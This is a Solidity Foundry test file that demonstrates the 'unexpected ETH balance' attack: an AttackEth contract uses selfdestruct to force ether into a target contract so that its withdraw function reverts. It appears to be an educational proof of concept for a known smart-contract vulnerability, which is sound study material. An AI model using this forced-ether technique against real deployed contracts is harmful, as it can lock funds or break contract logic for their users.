// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {UnexpectedEthBalance} from "../src/vectorAttack/UnexpectedEthBalance.sol";

contract LUnexpectedEthBalanceTest is Test {
    UnexpectedEthBalance unexpectedethbalance;

    AttackEth attacketh;

    function setUp() external {
        unexpectedethbalance = new UnexpectedEthBalance();
    }

    function test_withdraw_attack() external {
        // The attack
        attacketh = new AttackEth();
        vm.deal(address(attacketh), 1 wei);
        vm.startPrank(address(attacketh));

        attacketh.destroy(address(unexpectedethbalance));
        vm.expectRevert();
        unexpectedethbalance.withdraw();
        vm.stopPrank();
    }
}

contract AttackEth {
    function destroy(address _contractaddress) external {
        //"selfdestruct" has been deprecated. But this attack can be seen in a version lower than 0.8.20;
        selfdestruct(payable(_contractaddress));
    }

    receive() external payable {}
}
